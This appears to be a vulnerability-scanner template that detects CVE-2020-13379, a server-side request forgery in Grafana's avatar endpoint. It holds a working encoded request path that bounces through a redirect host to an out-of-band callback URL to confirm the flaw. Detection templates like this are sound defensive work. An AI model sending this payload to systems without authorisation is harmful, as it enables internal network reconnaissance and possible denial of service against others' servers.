id: CVE-2020-13379

info:
  name:
  description: The avatar feature in Grafana 3.0.1 through 7.0.1 has an SSRF Incorrect Access Control issue. This vulnerability allows any unauthenticated user/client to make Grafana send HTTP requests to any URL and return its result to the user/client. This can be used to gain information about the network that Grafana is running on. Furthermore, passing invalid URL objects could be used for DOS'ing Grafana via SegFault.
  reference: https://rhynorater.github.io/CVE-2020-13379-Write-Up
  author: geeknik
  severity: high
  tags: cve,cve2020,grafana,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/avatar/test%3fd%3dredirect.rhynorater.com%25253f%253b%252fbp.blogspot.com%252f{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh-protocol
        words:
          - "http"
